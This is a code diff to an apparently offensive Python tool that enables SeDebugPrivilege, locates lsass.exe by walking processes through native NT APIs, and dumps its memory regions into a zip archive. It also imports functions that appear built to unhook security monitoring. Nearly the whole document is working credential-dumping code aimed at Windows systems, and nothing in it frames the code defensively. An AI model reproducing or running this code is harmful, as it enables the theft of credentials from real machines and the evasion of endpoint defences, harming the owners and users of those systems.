@@ -1,7 +1,5 @@
 import os
-import sys
 import json
-import psutil
 import random
 import string
 import ctypes
@@ -9,6 +7,8 @@ import zipfile
 import argparse
 from ctypes import wintypes
 from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 
 # Constants
@@ -17,44 +17,32 @@ MemoryBasicInformation = 0
 ProcessBasicInformation = 0 
 PAGE_NOACCESS = 0x01
 MEM_COMMIT = 0x00001000
+TOKEN_ADJUST_PRIVILEGES = 0x0020
+TOKEN_QUERY = 0x0008
+SE_PRIVILEGE_ENABLED = 0x00000002
 
 
 # Structures
 class PROCESS_BASIC_INFORMATION(ctypes.Structure):
-    _fields_ = [
-        ("Reserved1", wintypes.LPVOID),
-        ("PebBaseAddress", wintypes.LPVOID),
-        ("Reserved2", wintypes.LPVOID * 2),
-        ("UniqueProcessId", wintypes.HANDLE),
-        ("Reserved3", wintypes.LPVOID)
-    ]
+    _fields_ = [ ("Reserved1", wintypes.LPVOID), ("PebBaseAddress", wintypes.LPVOID), ("Reserved2", wintypes.LPVOID * 2), ("UniqueProcessId", wintypes.HANDLE), ("Reserved3", wintypes.LPVOID) ]
 
 class MEMORY_BASIC_INFORMATION(ctypes.Structure):
-    _fields_ = [
-        ('BaseAddress', wintypes.LPVOID),
-        ('AllocationBase', wintypes.LPVOID),
-        ('AllocationProtect', wintypes.DWORD),
-        ('RegionSize', ctypes.c_size_t),
-        ('State', wintypes.DWORD),
-        ('Protect', wintypes.DWORD),
-        ('Type', wintypes.DWORD)
-    ]
+    _fields_ = [ ('BaseAddress', wintypes.LPVOID), ('AllocationBase', wintypes.LPVOID), ('AllocationProtect', wintypes.DWORD), ('RegionSize', ctypes.c_size_t), ('State', wintypes.DWORD), ('Protect', wintypes.DWORD), ('Type', wintypes.DWORD)]
+
+class LUID(ctypes.Structure):
+    _fields_ = [ ("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG) ]
+
+class LUID_AND_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [ ("Luid", LUID), ("Attributes", wintypes.DWORD) ]
+
+class TOKEN_PRIVILEGES(ctypes.Structure):
+    _fields_ = [ ("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1) ]
 
 class CLIENT_ID(ctypes.Structure):
-    _fields_ = [
-        ("UniqueProcess", wintypes.HANDLE),
-        ("UniqueThread", wintypes.HANDLE)
-    ]
+    _fields_ = [ ("UniqueProcess", wintypes.HANDLE), ("UniqueThread", wintypes.HANDLE) ]
 
 class OBJECT_ATTRIBUTES(ctypes.Structure):
-    _fields_ = [
-        ("Length", wintypes.ULONG),
-        ("RootDirectory", wintypes.HANDLE),
-        ("ObjectName", wintypes.LPVOID),
-        ("Attributes", wintypes.ULONG),
-        ("SecurityDescriptor", wintypes.LPVOID),
-        ("SecurityQualityOfService", wintypes.LPVOID)
-    ]
+    _fields_ = [ ("Length", wintypes.ULONG), ("RootDirectory", wintypes.HANDLE), ("ObjectName", wintypes.LPVOID), ("Attributes", wintypes.ULONG), ("SecurityDescriptor", wintypes.LPVOID), ("SecurityQualityOfService", wintypes.LPVOID) ]
 
 def initialize_object_attributes():
     return OBJECT_ATTRIBUTES(
@@ -69,6 +57,43 @@ def initialize_object_attributes():
 
 # NTAPI functions
 ntdll = ctypes.WinDLL("ntdll")
+NtOpenProcessToken = ntdll.NtOpenProcessToken
+NtOpenProcessToken.restype = wintypes.ULONG
+NtOpenProcessToken.argtypes = [
+    wintypes.HANDLE,
+    wintypes.DWORD,
+    ctypes.POINTER(wintypes.HANDLE)
+]
+NtAdjustPrivilegesToken = ntdll.NtAdjustPrivilegesToken
+NtAdjustPrivilegesToken.restype = wintypes.ULONG
+NtAdjustPrivilegesToken.argtypes = [
+    wintypes.HANDLE,
+    wintypes.BOOL,
+    ctypes.POINTER(TOKEN_PRIVILEGES),
+    wintypes.DWORD,
+    ctypes.POINTER(TOKEN_PRIVILEGES),
+    ctypes.POINTER(wintypes.DWORD)
+]
+NtOpenProcess = ntdll.NtOpenProcess
+NtOpenProcess.restype = wintypes.LONG
+NtOpenProcess.argtypes = [
+    wintypes.HANDLE,    # ProcessHandle
+    wintypes.DWORD,     # DesiredAccess
+    wintypes.LPVOID,    # ObjectAttributes
+    wintypes.LPVOID     # ClientId
+]
+NtClose = ntdll.NtClose
+NtClose.restype = wintypes.ULONG
+NtClose.argtypes = [wintypes.HANDLE]
+NtGetNextProcess = ntdll.NtGetNextProcess
+NtGetNextProcess.restype = wintypes.ULONG
+NtGetNextProcess.argtypes = [
+    wintypes.HANDLE,
+    wintypes.ULONG,
+    wintypes.ULONG,
+    wintypes.ULONG,
+    ctypes.POINTER(wintypes.HANDLE)
+]
 NtQueryInformationProcess = ntdll.NtQueryInformationProcess
 NtQueryInformationProcess.restype = wintypes.LONG
 NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, wintypes.HANDLE, wintypes.ULONG, wintypes.PULONG]
@@ -91,26 +116,12 @@ NtQueryVirtualMemory.argtypes = [
     wintypes.ULONG,     # MemoryInformationLength
     wintypes.LPVOID     # ReturnLength (optional)
 ]
-NtOpenProcess = ntdll.NtOpenProcess
-NtOpenProcess.restype = wintypes.LONG
-NtOpenProcess.argtypes = [
-    wintypes.HANDLE,    # ProcessHandle
-    wintypes.DWORD,     # DesiredAccess
-    wintypes.LPVOID,    # ObjectAttributes
-    wintypes.LPVOID     # ClientId
-]
 
 
 def get_random_string(length):
     characters = string.ascii_letters + string.digits
     random_string = ''.join(random.choices(characters, k=length))
     return random_string
-
-
-def get_pid(process_name):
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'] == process_name:
-            return proc.info['pid']
 
 
 def open_process(pid):
@@ -130,6 +141,83 @@ def open_process(pid):
         print("[-] Could not open handle to the process. Not running as administrator maybe?")
         sys.exit(0)
     return process_handle
+
+
+def get_proc_name_from_handle(process_handle):
+    process_basic_information_size = 48
+    peb_offset = 0x8
+    processparameters_offset = 0x20
+    commandline_offset = 0x68
+    
+    return_length = wintypes.ULONG()   
+    process_information = PROCESS_BASIC_INFORMATION()
+    return_length = wintypes.ULONG()
+    ntstatus = NtQueryInformationProcess(
+        process_handle,
+        ProcessBasicInformation,
+        ctypes.byref(process_information),
+        ctypes.sizeof(process_information),
+        ctypes.byref(return_length)
+    )
+
+    if ntstatus != 0:
+        raise ctypes.WinError()
+
+    # Get PEB->ProcessParameters
+    processparameters_pointer = process_information.PebBaseAddress + processparameters_offset
+    processparameters_address = read_remoteintptr(process_handle, processparameters_pointer)
+
+    # Get ProcessParameters->CommandLine
+    commandline_pointer = processparameters_address + commandline_offset
+    commandline_address = read_remoteintptr(process_handle, commandline_pointer)
+    commandline_value = read_remoteWStr(process_handle, commandline_address)
+    return commandline_value
+
+
+def GetProcessByName(proc_name):
+    MAXIMUM_ALLOWED = 0x02000000    
+    aux_handle = wintypes.HANDLE(0)
+    while True:
+        status = NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, ctypes.byref(aux_handle))
+        if status != 0:
+            break
+        try:
+            aux_proc_name = get_proc_name_from_handle(aux_handle)
+            if aux_proc_name == proc_name:
+                return aux_handle
+        except Exception as e:
+            pass
+    return wintypes.HANDLE(0)
+
+
+def enable_debug_privilege():
+    current_process = open_process(os.getpid())
+    token_handle = wintypes.HANDLE()
+
+    try:
+        ntstatus = NtOpenProcessToken(current_process, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ctypes.byref(token_handle))
+        if ntstatus != 0:
+            print(f"[-] Error calling NtOpenProcessToken. NTSTATUS: 0x{ntstatus:X}")
+            raise ctypes.WinError()
+
+        luid = LUID()
+        luid.LowPart = 20
+        luid.HighPart = 0
+        token_privileges = TOKEN_PRIVILEGES()
+        token_privileges.PrivilegeCount = 1
+        token_privileges.Privileges[0].Luid = luid
+        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+        ntstatus = NtAdjustPrivilegesToken(token_handle, False, ctypes.byref(token_privileges), ctypes.sizeof(token_privileges), None, None)
+        if ntstatus != 0:
+            print(f"[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{ntstatus:X}")
+            raise ctypes.WinError()
+
+        print("[+] SeDebugPrivilege enabled successfully.")
+
+    finally:
+        if token_handle:
+            NtClose(token_handle)
 
 
 def read_remoteintptr(process_handle, mem_address):
@@ -214,14 +302,13 @@ def main():
     else:
         pass
 
-    pid_ = get_pid("lsass.exe")
-    if pid_:
-        print("[+] PID: \t\t" + str(pid_))
-    else:
-        print("[-] PID not found")
-    process_handle = open_process(pid_)
+    # Get SeDebugPrivilege 
+    enable_debug_privilege()
+
+    # Get process handle
+    process_handle = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
     print("[+] Process handle: \t" + str(process_handle.value))
-    
+
     # Loop memory regions
     mem_address = 0
     proc_max_address_l = 0x7FFFFFFEFFFF
@@ -261,6 +348,9 @@ def main():
                 mem64list_arr.append({"field0": memdump_filename, "field1": hex(mem_address), "field2": memory_info.RegionSize})
     
         mem_address += memory_info.RegionSize
+
+    # Close process handle
+    NtClose(process_handle)
 
     file_name = "barrel.json"
     zip_name  = "barrel.zip"
